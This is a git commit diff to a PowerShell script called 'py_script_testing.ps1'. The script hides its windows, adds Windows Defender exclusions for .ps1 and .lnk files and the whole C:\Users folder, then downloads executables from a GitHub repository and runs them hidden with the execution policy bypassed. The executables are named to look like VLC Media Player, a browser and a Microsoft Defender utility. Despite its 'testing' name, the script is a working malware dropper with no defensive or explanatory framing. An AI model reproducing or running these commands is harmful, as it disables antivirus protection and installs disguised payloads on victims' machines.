7331d0dabdebdf7d31304b39988e61eeb448142a
rude90 <115774095+rude90@users.noreply.github.com>
2023-04-14 16:53:40 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -3,6 +3,11 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/fair.png -o C:\Users\fair.png
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/VLC%20Media%20Player.exe -o C:\Users\VLC.exe
+powershell.exe -w Hidden C:\Users\VLC.exe
 
-powershell.exe -w Hidden C:\Users\fair.png
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
+powershell.exe -w Hidden C:\Users\Browser.exe
+
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
+powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
